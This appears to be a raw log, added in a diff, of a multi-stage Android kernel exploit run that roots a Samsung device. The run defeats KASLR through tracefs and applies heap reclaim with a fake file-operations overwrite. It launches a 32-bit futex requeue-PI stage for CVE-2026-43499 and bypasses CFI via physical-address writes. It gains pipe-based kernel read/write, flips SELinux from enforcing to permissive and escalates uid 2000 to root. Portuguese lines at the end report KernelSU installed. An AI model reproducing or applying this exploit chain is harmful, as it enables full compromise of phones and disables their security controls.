+[*] [cfi-trace4] upstream=2b4e8a64b78d18f236f0d5b26cfd204bc46363ce target=S908BXXSMGZB2 policy=one-cfi-per-child lifecycle-breadcrumbs=1
+[*] [reclaim-life] stage=child-run-start pid=8433 inited=0 batch_cnt=0 rb_cur=0 active_batches=0 open_endpoints=0 current_open=0 ring=64
+[+] slide tracefs caller=ffffffc0082e7cc0 candidate=00000000001e8000
+[+] slide-kaslr-ok source=tracefs pid=8433 base=ffffffc0081e8000 slide=00000000001e8000 p0_offset=001e8000
+[*] mm leaked=ffffff800606da00 base=ffffff8006068000 object_index=24
+[*] mm slabinfo before-leak-close mm_struct           1802   1802    960   34    8 : tunables    0    0    0 : slabdata     53     53      0
+[-] [cfi-trace4] buddyinfo open failed errno=13
+[*] mm order3 absorb: pairs=683 skbs=2049 free3 -1 -> -1 (target=0)
+[*] mm skb reclaim sends=24/24 (pairs=8 hold)
+[*] [reclaim-life] stage=post-reclaim pid=8433 inited=1 batch_cnt=1 rb_cur=0 active_batches=1 open_endpoints=16 current_open=16 ring=64
+[*] replace_fake_fops this may cause deadlock
+[*] exp32 payload fake_fops=ffffff8006068180 fake_lock=ffffff80060684d0 write_target=ffffffc00a256060
+[*] [exp32-launch] phase=install-enter pid=8433 installed=0
+[*] install_embedded_exp32: /data/local/tmp/cve-exp32 (1645496 bytes)
+[*] [exp32-launch] phase=install-done pid=8433 path=/data/local/tmp/cve-exp32 bytes=1645496
+[*] [exp32-launch] phase=before-memfd pid=8433
+[*] [exp32-launch] phase=memfd-created pid=8433 fd=3
+[*] [exp32-launch] phase=payload-written pid=8433 fd=3 bytes=128
+[*] [exp32-launch] phase=before-fork pid=8433
+[*] [exp32-launch] phase=parent-after-fork pid=8433 child=14436
+[*] [exp32-launch] phase=parent-wait-start pid=8433 child=14436
+[*] [exp32-launch] phase=child-after-fork pid=14436 fd=3
+[*] [exp32-launch] phase=child-before-exec pid=14436 path=/data/local/tmp/cve-exp32 fd=3
+[*] [exp32-launch] phase=exec-syscall-enter pid=14436 path=/data/local/tmp/cve-exp32 fd=3
+[*] [exp32-enter] phase=constructor-enter
+[*] [exp32-enter] phase=main-enter pid=14436 argc=2
+[*] [exp32-enter] phase=before-pread pid=14436 fd=3
+[*] [exp32-enter] phase=payload-read pid=14436 fd=3 bytes=128
+[*] CVE-2026-43499 32-bit ARM stage (b0q) pid=14436
+[*] [exp32-enter] phase=threads-created pid=14436
+[-] pin_to_core: core 3 unavailable, using 4
+[-] pin_to_core: core 2 unavailable, using 6
+[*] waiter: FUTEX_WAIT_REQUEUE_PI on f_wait -> pi_target
+[*] main: FUTEX_CMP_REQUEUE_PI on f_wait -> pi_target
+[*] stamp probe: rc=-1 errno=99 — late validation, copy done (stamp lands)
+[*] consumer: trigger ret=0 errno=22 (cfs-nice)
+[*] main: exploit chain complete.
+[*] [exp32-launch] phase=parent-wait-end pid=8433 child=14436 raw_status=0
+[*] enter CFI stage
+[*] [cfi-trace6-physbase] slot-observe slot=0 phys_slide=00000000 target=ffffff800206e060 value=ffffffc00a06df38 errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=2 phys_slide=00010000 target=ffffff800207e060 value=3e2d434552202c22 errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=3 phys_slide=00018000 target=ffffff8002086060 value=0000000000806b20 errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=4 phys_slide=00020000 target=ffffff800208e060 value=c0000001000167c5 errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=5 phys_slide=00028000 target=ffffff8002096060 value=00000000008422a0 errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=6 phys_slide=00030000 target=ffffff800209e060 value=0000000000860020 errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=7 phys_slide=00038000 target=ffffff80020a6060 value=c0000001000157c5 errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=8 phys_slide=00040000 target=ffffff80020ae060 value=00000000007e97c8 errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=10 phys_slide=00050000 target=ffffff80020be060 value=0000000000006873 errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=12 phys_slide=00060000 target=ffffff80020ce060 value=00000003000002b9 errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=15 phys_slide=00078000 target=ffffff80020e6060 value=0000009dda5d1fb2 errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=17 phys_slide=00088000 target=ffffff80020f6060 value=5f6d70725f646864 errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=19 phys_slide=00098000 target=ffffff8002106060 value=00000000000001dc errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=22 phys_slide=000b0000 target=ffffff800211e060 value=000000a224676b55 errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=24 phys_slide=000c0000 target=ffffff800212e060 value=5f6d70725f646864 errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=26 phys_slide=000d0000 target=ffffff800213e060 value=00000000000001dc errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=29 phys_slide=000e8000 target=ffffff8002156060 value=0000009436c0a1bc errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=30 phys_slide=000f0000 target=ffffff800215e060 value=3030303062333131 errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=31 phys_slide=000f8000 target=ffffff8002166060 value=5f6d70725f646864 errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=33 phys_slide=00108000 target=ffffff8002176060 value=00000000000001dc errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=36 phys_slide=00120000 target=ffffff800218e060 value=00000098b88a3825 errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=39 phys_slide=00138000 target=ffffff80021a6060 value=6f72645f7064783e errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=40 phys_slide=00140000 target=ffffff80021ae060 value=4552202c64657070 errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=41 phys_slide=00148000 target=ffffff80021b6060 value=31202d2029296567 errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=42 phys_slide=00150000 target=ffffff80021be060 value=ffffffc00852df68 errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=43 phys_slide=00158000 target=ffffff80021c6060 value=0000000000000001 errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=45 phys_slide=00168000 target=ffffff80021d6060 value=6e656c5f753e2d43 errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=46 phys_slide=00170000 target=ffffff80021de060 value=00736b6c626d756e errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=48 phys_slide=00180000 target=ffffff80021ee060 value=ffffffc009b25fd1 errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=49 phys_slide=00188000 target=ffffff80021f6060 value=ffffffc009ad943e errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=51 phys_slide=00198000 target=ffffff8002206060 value=ffffffc009ab6c6c errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=52 phys_slide=001a0000 target=ffffff800220e060 value=0000000000000124 errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=54 phys_slide=001b0000 target=ffffff800221e060 value=00000000000001a4 errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=55 phys_slide=001b8000 target=ffffff8002226060 value=ffffffc009abaf4a errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=56 phys_slide=001c0000 target=ffffff800222e060 value=ffffffc008bfad44 errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=57 phys_slide=001c8000 target=ffffff8002236060 value=ffffffc00a235fd0 errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=58 phys_slide=001d0000 target=ffffff800223e060 value=0000000000000001 errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=59 phys_slide=001d8000 target=ffffff8002246060 value=6765746e695f7272 errno=0
+[+] [cfi-trace6-physbase] PHYS_SLOT_MATCH slot=61 phys_slide=001e8000 target=ffffff8002256060 value=ffffff8006068180 virtual_slide=00000000001e8000
+[*] [cfi-trace6-physbase] address-domains physical_slot=61 physical_slide=001e8000 virtual_slide=00000000001e8000 data_alias=ffffff8002256060 canonical_target=ffffffc00a256060
+[*] [cfi-trace4] t_us=714723190 cpu=0 cycle=1 class=EXPECTED postwrite=EXPECTED ret=8 target=ffffff8002256060 read=ffffff8006068180 want=ffffff8006068180 mm=ffffff800606da00 page=ffffff8006068000 object_index=24 reclaim=24/24 send_bytes=65536 errno=0
+[*] cfi write ret=35 errno=0
+[*] cfi read ret=35 errno=0
+[*] slide restore boot_id data pid=8433 ret=8 before=ffffffc00a4d5391 want=ffffffc00a4d5391 after=ffffffc00a4d5391 errno=0
+[*] slide restore rb parent type pid=8433 ret=8 before=0000000000000000 want=0000000000000001 after=0000000000000001 errno=0
+[*] phys step waiting for pipe page prepare...
+[*] prepare_pipe_buffer_page
+[*] pipe prep: skb sent, running kernelsnitch
+[*] pipe prep: leaked skb page base=ffffff888c078000
+[*] pipe prep: reclaim arrays done, reporting base
+[*] pipe prep: child reported base=ffffff888c078000 (got=8)
+[*] phys step pipe page base=ffffff888c078000
+[*] phys gate caches n2k=ffffff881e003680 c2k=0460000000000f82 pipe=0460000000000f82 base=ffffff888c078000
+[*] phys gate off=000 head=ffffffff22101e00 slab_cache=ffffff881e003680 match=1 type=ffffffff
+[*] phys step pipe probe found=1 pipebuf=ffffff888c078000 idx=26 scan=1/1/1
+[*] phys step probed read done ok=1 idx=26
+[*] phys step probed write done ok=1
+[*] phys step read64 done ok=1 value=306365737562656e
+[*] root direct start uid=2000 fd=3
+[*] [rmg-bridge] helper=/data/local/tmp/ksu-helper client_uid=2000
+[*] root umh helper mode=755 uid=2000 gid=2000 x_ok=1
+[*] root umh selinux enforcing byte 1 -> 0 (addr=ffffff8002430d58)
+[*] root umh queued wq=ffffff881e008400 pwq=ffffff881e1be000 pool=ffffff881e1c2c00 work=ffffff800606e000 entry=ffffff800606e008 color=0 counters=0/0/2 writes=1/1/1/1/1
+[*] root umh result wake=1 complete=1 retval=0 socket=1
+[+] pipe-physrw-summary pid=8433 done=1 root=1 kaslr=1 base=ffffffc0081e8000 slide=00000000001e8000
+[+] pipe physrw pid=8433 done=1 root=1 kaslr=1 read_ok=1 write_ok=1 rw64=1/1 uid=2000->0
+[+] stability keeper pid=20138 retaining reclaimed kernel pages
+[*] [trace4-supervisor] phase=child-return attempt=7/24 pid=8433 rc=0 t_us=730554341
+[*] [trace4-supervisor] phase=child-reaped attempt=7/24 child=8433 raw_status=0 elapsed_us=37178516 t_us=730556126
+[+] exploit completed attempt=7/24
+
+[+] Root bootstrap adquirido
+[*] Carregando o KernelSU tardiamente
+[+] Preparação do KernelSU completa
+[+] Canal de controle do KernelSU verificado
+[*] KernelSU ativo
+[+] Instalação completa
